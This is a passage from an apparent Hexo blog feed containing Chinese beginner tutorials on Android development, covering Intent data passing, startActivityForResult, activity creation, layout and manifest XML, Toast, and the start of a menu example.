class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.second_layout);</span><br><span class="line">        Intent intent=getIntent();</span><br><span class="line">        String data=intent.getStringExtra(<span class="string">&quot;extra_data&quot;</span>);</span><br><span class="line">        Toast.makeText(SecondActivity.<span class="keyword">this</span>,data,Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过声明一个Intent来获取上一个Activity传递下来的intent，使用Intent中的getStirngExtra( )方法来获取字符串</p><p>运行结果：<img src="/2020/09/21/Android/Android-intent%E7%9A%84%E5%BA%94%E7%94%A8/image-20200922002313277.png" class="lazyload" data-srcset="/2020/09/21/Android/Android-intent%E7%9A%84%E5%BA%94%E7%94%A8/image-20200922002313277.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922002313277"></p><h1 id="向上一个活动传递Intent"><a href="#向上一个活动传递Intent" class="headerlink" title="向上一个活动传递Intent"></a>向上一个活动传递Intent</h1><p>与startactivity( )相似startactivityForResult( )也可以用来启动下一个activity，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Button button1=(Button)findViewById(R.id.button_1);</span><br><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>,SecondActivity.class);</span><br><span class="line">        startActivityForResult(intent,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中第一个参数还是Intent，第二个参数是一个请求吗，用于在之后的回调中判断数据的来源</p><p>在SecondActivity中对按钮注册点击事件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Button button2=(Button)findViewById(R.id.button_2);</span><br><span class="line">button2.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> Intent();</span><br><span class="line">        intent.putExtra(<span class="string">&quot;data_return&quot;</span>,<span class="string">&quot;Hello 第一个&quot;</span>);</span><br><span class="line">        setResult(RESULT_OK,intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中可以看到setResult( )方法接收了两个参数，第一个参数用于向上一个活动返回处理结果，一般使用<code>RESULT_OK</code>或者<code>RESULT_CANCELED</code>两个值，第二个参数把带有数据的Intent传了回去，再调用finsh( )方法销毁了SecondActivity。</p><p><strong>由于使用的是startActivityForResult( )方法来启动的SecondActivity，在其被销毁后会回调onActivityResult( )方法，因此需要再FirstActivity中重写这个方法来得到返回数据</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, <span class="meta">@Nullable</span> Intent data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (requestCode)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span>(resultCode==RESULT_OK) &#123;</span><br><span class="line">                String returnedData=data.getStringExtra(<span class="string">&quot;data_return&quot;</span>);</span><br><span class="line">                Toast.makeText(FirstActivity.<span class="keyword">this</span>,returnedData, Toast.LENGTH_LONG).show();</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到该方法一共有三个参数：</p><p>第一个参数为requestCode，即我们启动活动时传入的请求码<code>startActivityForResult(intent,1)</code>，可以判断是哪一个操作启动了Activity。</p><p>第二个参数是一个resultCode，即我们在返回数据时传入的处理结果。<code>setResult(RESULT_OK,intent)</code></p><p>第三个参数data，即携带着返回的Intent。</p><p><strong>由于startActivityForResult( )方法可能调用很多不同的活动，所以一般先检查请求码来判断数据的来源，确定数据后，判断请求是否成功，最后从data中取值并打印出来，这样就完成了向上一个活动返回数据的工作。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecondActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBackPressed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Intent intent=<span class="keyword">new</span> Intent();</span><br><span class="line">       intent.putExtra(<span class="string">&quot;data_return&quot;</span>,<span class="string">&quot;你好，第一个&quot;</span>);</span><br><span class="line">       setResult(RESULT_OK,intent);</span><br><span class="line">       finish();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果通过back键传递信息，就需要重写onBackPressed( )</p><p><img src="/2020/09/21/Android/Android-intent%E7%9A%84%E5%BA%94%E7%94%A8/image-20200922005046056.png" class="lazyload" data-srcset="/2020/09/21/Android/Android-intent%E7%9A%84%E5%BA%94%E7%94%A8/image-20200922005046056.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922005046056"></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-activity创建</title>
      <link href="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/"/>
      <url>/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="创建一个空的activity"><a href="#创建一个空的activity" class="headerlink" title="创建一个空的activity"></a>创建一个空的activity</h1><p>项目在Project的路径如图所示：<img src="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200920215727764.png" class="lazyload" data-srcset="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200920215727764.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920215727764"></p><p>在该路径下创建新的窗口(不勾选任何xml文件 从头开始创建):<img src="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200920215850252.png" class="lazyload" data-srcset="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200920215850252.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920215850252"></p><p>创建完得代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.activitytest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>任何活动都应该重写Activity得OnCreate()方法，而FirstActivity中已经帮助重写了这个方法，OnCreat()方法非常简单，就是调用了父类得OnCreate()方法</strong></p><h1 id="创建以及加载布局（XML文件）"><a href="#创建以及加载布局（XML文件）" class="headerlink" title="创建以及加载布局（XML文件）"></a>创建以及加载布局（XML文件）</h1><p>在res目录下创建layout：<img src="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200920221601549.png" class="lazyload" data-srcset="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200920221601549.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920221601549"></p><p>在layout目录创建一个Layout resource file，命名为first_layout.xml</p><p><img src="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200920221753452.png" class="lazyload" data-srcset="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200920221753452.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920221753452"></p><p>由于创建得布局由LinearLayout作为根元素，因此现在布局文件中已经有一个LinerLayout元素了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span> <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用xml代码添加一个按钮</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span> <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Button 1&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中添加button_1的id语法为”@+id/button_1“；随后 android:layout_width指定与父元素同宽。android:layout_height指定了当前元素的高度，这里使用wrap_content表示当前元素的高度只要能刚好包含里面的内容就行。</p><h1 id="重新回到FirstActivity，在onCreate-方法中加入代码"><a href="#重新回到FirstActivity，在onCreate-方法中加入代码" class="headerlink" title="重新回到FirstActivity，在onCreate()方法中加入代码"></a>重新回到FirstActivity，在onCreate()方法中加入代码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.activitytest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.first_layout);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了setContentView()方法加载该活动的布局，在setContentView()方法，传入布局文件的id。</p><p><strong>在项目中添加的任何资源都会在R文件中生成一个相应的资源id，因此创建的first_layout.xml布局的id就已经添加到R文件中。只需要调用R.layout.first_layout就可以得到布局的id</strong></p><h1 id="在AndroidManifest文件中注册（主要的XML文件）"><a href="#在AndroidManifest文件中注册（主要的XML文件）" class="headerlink" title="在AndroidManifest文件中注册（主要的XML文件）"></a>在AndroidManifest文件中注册（主要的XML文件）</h1><p>在该文件路径：<img src="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200920223743511.png" class="lazyload" data-srcset="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200920223743511.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920223743511"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.activitytest&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Activity中注册声明要放在&lt;application&gt;标签中，这里可以看到&lt;activity&gt;标签来对活动注册的。注册活动仍然未能运行，就是在&lt;activity&gt;标签内部加入&lt;intent-filter&gt;标签，并在这个标签里添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.activitytest&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.FirstActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h1><p><img src="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200921000731571.png" class="lazyload" data-srcset="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200921000731571.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200921000731571"></p><h1 id="添加一个Toast"><a href="#添加一个Toast" class="headerlink" title="添加一个Toast"></a>添加一个Toast</h1><p>Toast类似与web的alert();首先在按下button1的时候，发出toast。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.first_layout);</span><br><span class="line">        Button button1=(Button)findViewById(R.id.button_1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Toast.makeText(FirstActivity.<span class="keyword">this</span>,<span class="string">&quot;hello world&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在activity中，通过findViewById()方法获取到在布局中定义的元素，传入的为R.id.button_1,获取到按钮实列</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Button button1=(Button)findViewById(R.id.button_1);</span><br></pre></td></tr></table></figure><p><strong>然后，通过调用setOnClickListener()方法为按钮一个监听器，点击按钮就会执行监听器的OnClick()方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">      <span class="comment">//点击执行的内容</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>最后，关于执行的内容Toast，通过该类中的静态方法(不用实例直接调用)Toast.makeText(FirstActivity.this,”hello world”,Toast.LENGTH_SHORT).show();</strong></p><p><strong>“FirstActivity.this,”hello world”,Toast.LENGTH_SHORT”为其中的三个参数。</strong></p><p><strong>第二个参数是要显示的内容，第三个是显示的时长有Toast.LENGTH_SHORT和Toast.LENGTH_LONG</strong></p><p>运行结果：<img src="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200921002846100.png" class="lazyload" data-srcset="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200921002846100.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200921002846100"></p><h1 id="添加一个Menu"><a href="#添加一个Menu" class="headerlink" title="添加一个Menu"></a>添加一个Menu</h1><p>在src/res下添加一个menu，在该文件夹下添加个</p><p><img src="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200921004332657.png" class="lazyload" data-srcset="/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/image-20200921004332657.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200921004332657"></p><p>命名为main.xml。添加代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">menu</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/add_item&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">&quot;ADD&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/remove_item&quot;</span></span></span><br><span class="line"><span class="tag"> 